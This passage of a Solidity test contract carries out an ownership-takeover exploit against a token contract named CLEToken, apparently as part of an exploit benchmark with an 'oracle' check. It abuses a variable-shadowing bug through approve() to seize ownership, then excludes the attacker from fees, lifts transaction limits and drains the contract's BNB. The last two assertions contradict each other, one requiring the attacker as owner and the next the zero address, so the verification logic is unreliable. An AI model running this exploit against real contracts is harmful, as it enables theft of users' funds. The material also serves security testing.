        address initialOwner = CLEToken(TARGET).owner();
        console.log("Initial owner:", initialOwner);

        // Step 2: Call approve with spender=attacker and amount=0
        // This triggers the variable shadowing vulnerability
        CLEToken(TARGET).approve(attacker, 0);

        // Step 3: Verify we are now the owner
        address newOwner = CLEToken(TARGET).owner();
        console.log("New owner:", newOwner);
        require(newOwner == attacker, "Exploit failed: attacker is not owner");

        // Step 4: Demonstrate owner privileges
        // Option 1: Exclude ourselves from fees
        CLEToken(TARGET).excludeFromFee(attacker);

        // Option 2: Set max transaction percent to 100%
        CLEToken(TARGET).setMaxTxPercent(100);

        // Option 3: If contract has BNB balance, drain it
        // First, send some BNB to the contract to demonstrate
        (bool sent, ) = TARGET.call{value: 1 ether}("");
        require(sent, "Failed to send BNB to contract");

        uint256 contractBalanceBefore = address(TARGET).balance;
        console.log("Contract BNB balance before drain:", contractBalanceBefore);

        // Drain the BNB
        CLEToken(TARGET).transferDustBNB();

        uint256 contractBalanceAfter = address(TARGET).balance;
        console.log("Contract BNB balance after drain:", contractBalanceAfter);
        require(contractBalanceAfter == 0, "Failed to drain BNB");

        // Final verification for the oracle
        assertEq(newOwner, attacker, "Owner should be attacker");
        assertEq(CLEToken(TARGET).owner(), address(0), "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

